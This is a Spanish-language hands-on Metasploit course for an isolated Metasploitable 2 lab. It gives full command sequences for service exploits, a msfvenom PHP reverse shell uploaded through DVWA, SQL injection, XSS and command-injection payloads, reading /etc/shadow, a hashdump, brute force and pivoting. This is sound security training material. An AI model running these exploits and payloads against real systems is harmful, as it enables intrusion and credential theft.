    00 Advertencia legal y ética

    Usá esto solo en tu propio laboratorio aislado Metasploitable 2 es una máquina creada a propósito para ser vulnerable y practicar sin riesgo. Escanear o explotar sistemas que no te pertenecen, sin permiso explícito y por escrito, es delito en prácticamente todos los países.
    • Trabajá siempre con la VM en una red host-only, nunca expuesta a internet ni a tu red doméstica.
    • Metasploitable 2 tiene servicios inseguros abiertos a propósito: en una red real cualquiera podría comprometerla.
    • Lo que aprendas tiene valor defensivo: entender cómo se explota un servicio es lo que te permite protegerlo.
    • No practiques contra servidores de terceros, routers ajenos ni servicios en la nube que no hayas contratado para ese fin.

    01 Qué es Metasploit y cómo se organiza

    Metasploit Framework es una plataforma de código abierto (mantenida por Rapid7) para desarrollar, probar y ejecutar código de explotación contra objetivos remotos. Su valor está en que estandariza todo el flujo: buscar un fallo, elegir un exploit, cargar un payload y gestionar la sesión que se abre al conseguir acceso.

    La interfaz principal es msfconsole, una consola interactiva. Todo gira alrededor de los módulos, piezas reutilizables organizadas por tipo:

    TipoPara qué sirveEjemplo
    exploitAprovecha una vulnerabilidad para ejecutar código en el objetivoexploit/multi/samba/usermap_script
    payloadEl código que corre en el objetivo tras explotarlo (shell, Meterpreter)payload/cmd/unix/reverse
    auxiliaryEscaneo, enumeración, fuerza bruta; no abre sesiónauxiliary/scanner/portscan/tcp
    postAcciones tras conseguir acceso (hashes, pivoting)post/linux/gather/hashdump
    encoderOfusca el payload para evadir filtrosx86/shikata_ga_nai

    Conceptos que vas a usar en cada ejercicio:

    • RHOSTS / RHOST: la IP del objetivo remoto.
    • LHOST: tu IP de atacante, a la que el objetivo se conecta de vuelta en un reverse shell.
    • LPORT: el puerto donde escuchás en tu máquina (4444 por defecto).
    • SESSION: una conexión ya establecida con un objetivo comprometido.
    • datastore: el conjunto de variables que configurás con set.

    02 Preparación del laboratorio en Kubuntu

    El objetivo es tener dos máquinas en la misma red privada y aislada: tu Kubuntu (atacante) y Metasploitable 2 (víctima), comunicadas por una red host-only sin salida a internet.

    2.1 Instalar VirtualBox

    bash · Kubuntu
    sudo apt update
sudo apt install -y virtualbox virtualbox-ext-pack

    2.2 Descargar Metasploitable 2

    1. Descargá el ZIP oficial desde SourceForge (proyecto metasploitable).
    2. Descomprimilo: obtenés una carpeta con un archivo .vmdk (el disco de la VM).
    bash
    cd ~/Descargas
unzip metasploitable-linux-2.0.0.zip

    2.3 Crear la VM en VirtualBox

    1. VirtualBox → Nueva. Nombre: Metasploitable2. Tipo: Linux. Versión: Ubuntu (64-bit).
    2. Memoria: 512 MB alcanza de sobra.
    3. En disco duro elegí Usar un archivo de disco virtual existente y seleccioná el .vmdk.
    4. Creá la VM (todavía no la arranques).

    2.4 Configurar la red host-only (paso crítico de aislamiento)

    1. VirtualBox → Archivo → Herramientas → Administrador de red (Host Network Manager).
    2. Creá una red host-only (ej. vboxnet0), rango típico 192.168.56.0/24 con DHCP activado.
    3. Config. de Metasploitable2 → Red → Adaptador 1 → Adaptador solo-anfitrión → elegí vboxnet0.
    4. Si tu Kubuntu también es una VM, dale un adaptador host-only en la misma red. Si Kubuntu es tu sistema real, ya forma parte de esa red.

    2.5 Arrancar y obtener las IP

    1. Arrancá Metasploitable 2. Login por consola: usuario msfadmin, contraseña msfadmin.
    2. Dentro de la víctima ejecutá ifconfig y anotá su IP.
    3. En Kubuntu ejecutá ip a y anotá tu IP en esa red.
    4. Probá conectividad: desde Kubuntu, ping a la víctima. Si responde, el laboratorio está listo.
    bash · verificar conexión
    ping -c 3 {{RHOST}}
    Las IP del panel de arribaEn toda la página uso {{RHOST}} (víctima) y {{LHOST}} (atacante). Cambiá los valores en el panel y cada comando se actualiza solo.

    03 Instalar y arrancar Metasploit

    3.1 Instalar el framework

    Lo recomendado es el instalador oficial de Rapid7, que trae todas las dependencias:

    bash
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

    Alternativa rápida si ya tenés repos de pentesting: sudo apt install -y metasploit-framework.

    3.2 Inicializar la base de datos

    Metasploit usa PostgreSQL para guardar hosts, servicios, credenciales y resultados. Inicializala una sola vez:

    bash
    sudo systemctl enable --now postgresql
sudo msfdb init

    3.3 Arrancar la consola y verificar

    bash
    msfconsole

    Ya dentro de msf6 >, comprobá que la base está conectada con db_status. Si dice que no, salí, corré sudo msfdb reinit y volvé a entrar.

    3.4 Crear un workspace para el curso

    Un workspace separa tus datos por proyecto. Creá uno dedicado:

    msf6 >
    workspace -a metasploitable2
workspace

    El segundo comando lista los workspaces y marca con * el activo. Desde aquí, todo lo que descubras queda ordenado ahí.

    04 Comandos esenciales de msfconsole

    Memorizá el flujo search → use → info → set → run. Estos son los comandos que repetís en casi todos los ejercicios:

    ComandoQué hace
    search <término>Busca módulos por nombre, CVE o servicio
    use <ruta>Carga un módulo para trabajar con él
    infoDescripción, opciones y referencias del módulo
    show optionsParámetros que hay que configurar
    show payloadsPayloads compatibles con el exploit cargado
    set <OPCIÓN> <valor>Define un parámetro
    setg <OPCIÓN> <valor>Parámetro global, persiste entre módulos
    checkComprueba si el objetivo es vulnerable sin explotarlo
    run / exploitLanza el módulo
    sessions / sessions -i <id>Lista sesiones / interactúa con una
    background o Ctrl+ZDeja la sesión en segundo plano

    Flujo mínimo para cualquier exploit:

    msf6 >
    search nombre_del_servicio
use <ruta_que_encontraste>
show options
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
run

    05 Metodología: las fases de un test

    Un ataque no es lanzar exploits al azar; se sigue un orden lógico. El resto del curso está estructurado según estas fases:

    1. Reconocimiento: qué máquinas hay y qué puertos tienen abiertos (escaneo con nmap).
    2. Enumeración: qué servicio y qué versión corre en cada puerto. La versión es la pista hacia el exploit.
    3. Análisis de vulnerabilidades: cruzar versiones con fallos conocidos (CVE, módulos de Metasploit).
    4. Explotación: usar el exploit adecuado para conseguir una sesión (shell o Meterpreter).
    5. Post-explotación: recoger información, escalar privilegios y pivotar.
    6. Documentación: registrar qué funcionó, qué era vulnerable y cómo se soluciona.

    06 Fase 1 — Reconocimiento y escaneo

    Metasploit integra nmap con db_nmap, que guarda los resultados directamente en la base de datos.

    6.1 Escaneo básico con detección de versiones

    msf6 >
    db_nmap -sV {{RHOST}}

    -sV detecta la versión de cada servicio: es la opción más importante del laboratorio. Vas a ver FTP (21), SSH (22), Telnet (23), HTTP (80), Samba (139/445), MySQL (3306), PostgreSQL (5432), VNC (5900) y más.

    6.2 Escaneo completo (todos los puertos + SO)

    msf6 >
    db_nmap -sV -O -p- {{RHOST}}

    -O identifica el sistema operativo y -p- escanea los 65535 puertos, para no perderte servicios altos como el backdoor en 1524 o UnrealIRCd en 6667.

    6.3 Revisar lo descubierto

    msf6 >
    hosts
services -u {{RHOST}}

    services lista cada puerto, protocolo, estado y versión detectada: esa tabla es tu mapa para las fases siguientes.

    07 Fase 2 — Enumeración de servicios

    Ahora profundizás en cada servicio para confirmar versión, usuarios y configuraciones débiles. El patrón es siempre auxiliary/scanner/<servicio>/....

    7.1 Versión de FTP (confirma el vsftpd vulnerable)

    msf6 >
    use auxiliary/scanner/ftp/ftp_version
set RHOSTS {{RHOST}}
run

    Confirma, por ejemplo, vsftpd 2.3.4 — versión con backdoor conocido.

    7.2 Enumerar Samba (versión, recursos y usuarios)

    msf6 >
    use auxiliary/scanner/smb/smb_version
set RHOSTS {{RHOST}}
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS {{RHOST}}
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS {{RHOST}}
run

    7.3 Ver todos los módulos de un servicio

    msf6 >
    search type:auxiliary smb
search type:auxiliary ftp
search type:auxiliary http

    Apuntá cada versión que encuentres: cada una es la llave para la fase de explotación.

    08 Fase 3 — Explotación de servicios

    Cada ejemplo sigue el mismo flujo y ataca una vía distinta. Hacelos en orden: van de muy fácil a más elaborado.

    8.1 vsftpd 2.3.4 — backdoor (el más sencillo)

    La versión 2.3.4 del FTP tiene un backdoor: si el usuario contiene :), se abre una shell en el puerto 6200.

    msf6 >
    use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {{RHOST}}
check
run

    Obtenés una shell directa. Probá id, whoami, uname -a: sos root. Es una command shell, no Meterpreter; para salir, exit.

    8.2 Samba usermap_script — RCE con acceso root

    msf6 >
    use exploit/multi/samba/usermap_script
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
set payload cmd/unix/reverse
run

    Se abre una sesión; comprobá privilegios con id y dejala en segundo plano con Ctrl+Z.

    8.3 UnrealIRCd 3.2.8.1 — backdoor en IRC

    msf6 >
    use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
set payload cmd/unix/reverse
run

    8.4 distcc — ejecución en el compilador distribuido

    msf6 >
    use exploit/unix/misc/distcc_exec
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
run

    Da una shell como usuario daemon, no root: buena excusa para practicar escalada en la fase 4.

    8.5 Java RMI — da Meterpreter

    msf6 >
    use exploit/multi/misc/java_rmi_server
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
run
    Patrón generalTomá la versión exacta de la enumeración → search en msfconsole → use + info → completá RHOSTS/LHOST/payload → check y run. Si falla, revisá IPs, que el servicio siga arriba y probá otro payload.

    09 Explotación web de Metasploitable 2

    En el puerto 80 Metasploitable 2 sirve varias aplicaciones vulnerables. Abrí http://{{RHOST}}/ en el navegador de Kubuntu y vas a ver un menú con DVWA, Mutillidae, phpMyAdmin, TWiki y WebDAV. Aquí combinamos módulos de Metasploit con práctica manual en el navegador.

    AppURLQué practicás
    DVWA/dvwa/SQLi, XSS, command injection, subida de archivos (login admin/password)
    Mutillidae/mutillidae/OWASP Top 10 guiado
    phpMyAdmin/phpMyAdmin/Acceso a MySQL por web, a veces sin contraseña
    TWiki/twiki/RCE con módulo de Metasploit
    Tomcat Manager:8180/managerDespliegue de WAR malicioso (tomcat/tomcat)
    WebDAV/dav/Subida de archivos sin autenticación

    9.1 Reconocimiento web con Metasploit

    Antes de atacar, enumerá el servidor web: versión, archivos sensibles y directorios.

    msf6 >
    use auxiliary/scanner/http/http_version
set RHOSTS {{RHOST}}
run

use auxiliary/scanner/http/robots_txt
set RHOSTS {{RHOST}}
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS {{RHOST}}
run

    9.2 PHP CGI argument injection (CVE-2012-1823) — shell directa

    La versión de PHP de Metasploitable 2 permite inyectar argumentos al binario CGI y ejecutar código. Es el camino más rápido de web a shell con un solo módulo.

    msf6 >
    use exploit/multi/http/php_cgi_arg_injection
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
run

    Abre una sesión Meterpreter de PHP. Probá getuid y sysinfo.

    9.3 Tomcat Manager — desplegar un WAR malicioso

    El Tomcat del puerto 8180 tiene credenciales por defecto. Primero confirmalas por fuerza bruta y luego desplegá un payload.

    msf6 >
    use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS {{RHOST}}
set RPORT 8180
run

    Con las credenciales válidas (tomcat/tomcat), desplegá un WAR que abre Meterpreter de Java:

    msf6 >
    use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {{RHOST}}
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST {{LHOST}}
run

    9.4 TWiki — ejecución remota de comandos

    msf6 >
    use exploit/unix/webapp/twiki_history
set RHOSTS {{RHOST}}
set LHOST {{LHOST}}
run

    9.5 De DVWA a shell: subir un payload PHP

    Este es el ejercicio web más instructivo porque une navegador + Metasploit. En DVWA, con la seguridad en Low, la sección File Upload acepta cualquier archivo. Generás un reverse shell en PHP con msfvenom, lo subís y lo ejecutás.

    1. Generá el payload en Kubuntu con msfvenom:
    bash · Kubuntu
    msfvenom -p php/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT=4444 -f raw -o shell.php
    1. En msfconsole, poné un handler a la escucha para recibir la conexión:
    msf6 >
    use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST {{LHOST}}
set LPORT 4444
run
    1. En DVWA (http://{{RHOST}}/dvwa/, login admin/password, seguridad Low) → Upload → subí shell.php. DVWA te dice la ruta donde quedó, normalmente ../../hackable/uploads/shell.php.
    2. Abrí esa ruta en el navegador: http://{{RHOST}}/dvwa/hackable/uploads/shell.php. Al cargarla, el handler recibe la sesión Meterpreter.
    3. Volvé a msfconsole y comprobá: getuid, sysinfo.

    9.6 DVWA / Mutillidae — vulnerabilidades manuales

    No todo pasa por un módulo. En DVWA con seguridad Low, practicá estas tres de forma manual, que son la base de la seguridad web:

    VulnerabilidadPrueba en DVWA
    SQL InjectionEn el campo de ID escribí 1' OR '1'='1 para volcar todos los usuarios
    XSS reflejadoEn el campo de nombre: <script>alert(1)</script>
    Command InjectionEn el ping, un host seguido de ; cat /etc/passwd o ; id
    Herramienta complementariaPara automatizar la inyección SQL podés usar sqlmap (fuera de Metasploit) apuntando a la URL vulnerable de DVWA. Es el siguiente paso natural una vez que entendés la inyección a mano.

    10 Payloads y Meterpreter

    El exploit abre la puerta; el payload es lo que corre del otro lado.

    10.1 Bind vs reverse

    • bind shell: el objetivo abre un puerto y esperás conectarte. Falla si hay firewall de entrada.
    • reverse shell: el objetivo se conecta hacia tu LHOST:LPORT. Es lo más fiable, porque el tráfico sale desde la víctima.

    10.2 Qué payload usar

    PayloadCuándo
    cmd/unix/reverseShell simple en Linux, sin dependencias
    linux/x86/meterpreter/reverse_tcpMeterpreter nativo en Linux 32 bits
    java/meterpreter/reverse_tcpVectores Java (Tomcat, RMI)
    php/meterpreter/reverse_tcpApps web en PHP (ej. DVWA)

    10.3 Comandos de Meterpreter

    ComandoQué hace
    sysinfo / getuidInfo del sistema / usuario actual
    getsystemIntenta escalar a privilegios máximos
    ps / migrate <pid>Procesos / mover Meterpreter a uno más estable
    shellAbre una shell del sistema dentro de la sesión
    download / uploadTransferir archivos entre víctima y Kubuntu
    hashdumpVuelca los hashes de contraseñas

    11 Fase 4 — Post-explotación

    Ya estás dentro. Esta fase extrae el verdadero valor: credenciales, archivos y acceso a otras máquinas. Trabajá sobre una sesión abierta (sessions para verlas).

    11.1 Volcar hashes

    shell / meterpreter
    cat /etc/passwd
cat /etc/shadow

    Con Meterpreter, automatizá el volcado con un módulo post:

    msf6 >
    use post/linux/gather/hashdump
set SESSION 1
run

    Los hashes del /etc/shadow se intentan romper offline con John the Ripper o hashcat.

    11.2 Sugeridor de exploits locales (escalada)

    Si entraste como daemon por distcc, no sos root. Pedí sugerencias de escalada:

    msf6 >
    use post/multi/recon/local_exploit_suggester
set SESSION 1
run

    11.3 Pivoting

    Si la víctima tocara una segunda red, Meterpreter enruta tráfico a través de ella para atacar máquinas que no alcanzás directo:

    meterpreter >
    run autoroute -s 192.168.57.0/24
    Limpiá al terminarCerrá sesiones con sessions -K, matá handlers con jobs -K y, para empezar limpio, reiniciá la VM de Metasploitable 2.

    12 Fuerza bruta y credenciales

    Muchas veces el camino más corto es una contraseña débil. Hay módulos auxiliary para casi cualquier servicio.

    12.1 SSH

    msf6 >
    use auxiliary/scanner/ssh/ssh_login
set RHOSTS {{RHOST}}
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set STOP_ON_SUCCESS true
run

    Si encuentra una credencial válida, ssh_login abre directamente una sesión.

    12.2 MySQL con contraseña vacía

    msf6 >
    use auxiliary/scanner/mysql/mysql_login
set RHOSTS {{RHOST}}
set USERNAME root
set BLANK_PASSWORDS true
run

    En Metasploitable 2, MySQL suele aceptar root sin contraseña: un hallazgo clásico. Revisá todo lo recogido con creds.

    13 Ejercicios prácticos progresivos

    Resolvelos en orden, sin mirar los módulos anteriores hasta intentarlo. El objetivo es internalizar el flujo enumerar → buscar módulo → explotar.

    Nivel 1 — Básico

    • Escaneá con db_nmap -sV y listá con services todos los puertos abiertos.
    • Conseguí shell root por el backdoor de vsftpd y leé /etc/shadow.
    • Logueate por SSH con msfadmin/msfadmin usando ssh_login.

    Nivel 2 — Intermedio

    • Explotá Samba con usermap_script y dejá la sesión en segundo plano.
    • Entrá a MySQL con root y contraseña vacía; listá las bases de datos.
    • Reconocé las apps web con dir_scanner y abrí DVWA en el navegador.

    Nivel 3 — Avanzado (web + post)

    • Conseguí shell con php_cgi_arg_injection y ejecutá getuid.
    • Subí un shell.php por DVWA y recibilo con multi/handler.
    • Desplegá un WAR en Tomcat (8180) y abrí Meterpreter de Java.
    • Volcá hashes con post/linux/gather/hashdump y guardalos para romperlos con John.

    Reto final

    • Documentá un mini-informe: por cada servicio o app explotada, anotá puerto, versión, módulo usado, nivel de acceso y cómo lo solucionarías (actualizar, cerrar el puerto, cambiar la contraseña). Eso es exactamente lo que se entrega en un pentest real.

    Tres hábitos que evitan casi todo: confirmá LHOST/RHOSTS con show options antes de cada run; si algo deja de responder, reiniciá Metasploitable 2 a un estado limpio; y leé el mensaje de error completo, que suele decir exactamente qué falta.

    15 Recursos para seguir

    • Documentación oficial de Metasploit (Rapid7): referencia de módulos y comandos.
    • TryHackMe y Hack The Box: laboratorios guiados online de dificultad creciente.
    • VulnHub: máquinas vulnerables descargables para VirtualBox, como Metasploitable.
    • Metasploitable 3: versión más moderna (Windows y Linux), el siguiente laboratorio.
    • OWASP Juice Shop y sqlmap: para profundizar en seguridad web.
    • John the Ripper / hashcat: para romper los hashes de la post-explotación.
    • Certificaciones: eJPT (inicial) y luego OSCP (el estándar práctico de la industria).

    No se trata de memorizar exploits, sino de interiorizar el método. Cada máquina nueva es el mismo ciclo —escanear, enumerar, identificar la versión vulnerable, explotar, profundizar— aplicado a servicios distintos.
